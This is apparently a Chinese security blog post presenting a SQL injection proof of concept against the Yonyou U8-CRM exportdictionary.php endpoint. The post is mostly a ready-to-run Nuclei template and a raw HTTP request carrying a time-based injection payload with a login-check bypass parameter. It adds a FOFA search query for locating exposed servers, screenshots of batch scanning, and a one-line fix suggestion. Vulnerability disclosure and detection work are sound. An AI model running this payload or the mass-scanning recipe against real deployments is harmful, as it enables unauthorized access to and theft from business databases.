#  用友U8-CRM的exportdictionary.php接口处存在SQL注入漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-08-19 14:42  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
用友U8-CRM的/devtools/tools/exportdictionary.php接口处存在SQL注入漏洞。这可能导致泄露敏感数据、破坏数据库完整性，甚至获取对数据库的完全控制。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: yongyouU8_CRM-exportdictionary_php-SQL
info:
  name: 用友U8-CRM接口exportdictionary.php存在SQL注入漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: body="用友U8CRM"

http:
  - raw:
      - |
        GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:3%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Cookie: PHPSESSID=bgsesstimeout-

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3  && duration<=6 && status_code==200"
```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：body="用友U8CRM"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnctlKuk0fxhwEJQBanfs52eL8UjmFbIzDZFwC83O5pvWgOS7vw8Nks7Zb5oBexl1yz9Qwwaq2rQwg/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnctlKuk0fxhwEJQBanfs52eyrrMUQwGZiaR065iatHqyKh4VtA2MEd2MSsRgPms3gy3vFHj1yvC2bhw/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnctlKuk0fxhwEJQBanfs52eEHhGPqesTFJob3POlS3g81fQrvRFF4LEyubNrHeFBBgbnibibdbnsSQw/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:3%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Cookie: PHPSESSID=bgsesstimeout-


```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnctlKuk0fxhwEJQBanfs52eV9Jthf9WeAhk9QhHRyygDwvErGaqSbS0QBZ9DKbOibXU84XZbqCDxqA/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
更新当前系统或软件至最新版  
  
  
  
  
